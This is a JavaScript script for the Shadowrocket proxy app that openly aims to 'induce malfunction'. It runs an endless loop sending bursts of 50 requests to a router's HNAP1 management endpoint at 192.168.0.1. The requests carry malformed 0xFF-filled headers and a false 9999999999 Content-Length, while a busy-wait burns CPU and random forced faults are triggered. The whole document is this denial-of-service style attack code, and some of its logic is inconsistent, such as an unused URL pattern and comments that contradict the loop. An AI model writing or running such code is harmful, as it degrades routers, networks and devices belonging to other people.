// Shadowrocket Script - Inducing Malfunction via HTTP Request Manipulation

// Define the URL pattern to listen for
const urlPattern = /^http:\/\/192\.168\.0\.1\/HNAP1\/$/;

// Function to handle the HTTP request and induce Shadowrocket malfunction
function induceMalfunction() {
    while (true) {
        // Generate HTTP requests designed to consume resources or trigger errors
        for (let i = 0; i < 50; i++) {  // Moderate number of requests
            $httpClient.get({
                url: "http://192.168.0.1/HNAP1/",
                timeout: Math.floor(Math.random() * 5000) + 500,  // Random short timeout to trigger failures
                headers: {
                    "User-Agent": "Shadowrocket-Malfunction-Test",
                    "X-Malformed-Header": generateMalformedHeader(),
                    "Content-Length": generateExcessiveLength(),
                    "Connection": "keep-alive"
                }
            }, function(error, response, data) {
                if (error) {
                    // Log the error
                    console.log("Request error (intended): " + error);
                } else {
                    // Log success (optional)
                    console.log("Request succeeded with status: " + response.status);
                }
            });
        }

        // Introduce slight delays between bursts to avoid overwhelming the system
        sleep(1000);  // 1-second delay between bursts

        // Occasionally simulate a more significant error condition
        if (Math.random() < 0.2) {  // 20% chance to induce a critical fault
            console.log("Simulating critical fault");
            simulateCriticalFault();
        }
    }
}

// Function to generate a malformed header
function generateMalformedHeader() {
    return String.fromCharCode.apply(null, Array(500).fill(0xFF));  // Fill header with invalid characters
}

// Function to generate an excessive content length
function generateExcessiveLength() {
    return "9999999999";  // Set an unrealistically high content length
}

// Function to simulate a critical fault
function simulateCriticalFault() {
    $done({error: "Simulated critical fault to induce malfunction"});
}

// Simulate sleep/delay function
function sleep(ms) {
    const start = Date.now();
    while (Date.now() - start < ms) {
        // Busy wait
    }
}

// Run the malfunction induction function
induceMalfunction();
